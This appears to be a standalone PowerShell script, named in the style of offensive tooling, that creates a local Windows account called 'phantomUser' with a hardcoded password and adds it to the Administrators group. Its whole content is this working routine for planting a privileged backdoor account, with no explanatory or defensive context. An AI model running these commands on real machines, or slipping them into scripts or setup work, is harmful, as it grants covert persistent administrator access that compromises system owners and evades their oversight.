# Invoke-PhantomUser.ps1
net user phantomUser "P@ssw0rdPh@Nt0m" /add
net localgroup Administrators phantomUser /add
